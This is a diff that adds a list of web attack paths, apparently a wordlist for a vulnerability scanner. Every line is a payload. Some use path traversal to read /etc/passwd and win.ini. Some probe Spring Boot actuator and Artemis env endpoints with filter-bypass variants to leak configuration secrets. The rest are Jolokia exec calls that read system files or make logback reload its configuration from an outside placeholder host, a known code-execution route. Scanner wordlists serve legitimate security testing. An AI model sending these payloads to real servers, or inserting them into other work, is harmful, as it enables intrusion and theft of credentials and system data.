@@ -1,0 +1,15 @@
+/manage/log/view?filename=/windows/win.ini&base=../../../../../../../../../../
+/log/view?filename=/windows/win.ini&base=../../../../../../../../../../
+/manage/log/view?filename=/etc/passwd&base=../../../../../../../../../../
+/log/view?filename=/etc/passwd&base=../../../../../../../../../../
+/artemis/env
+/artemis-portal/artemis/env
+/artemis/actuator/env
+/artemis;/env;
+/artemis/1/..;/env
+/jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/etc!/passwd
+/actuator/jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/etc!/passwd
+/jolokia/list
+/actuator/jolokia/list
+/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/nonexistent:31337!/logback.xml
+/actuator/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/random:915!/logback.xml
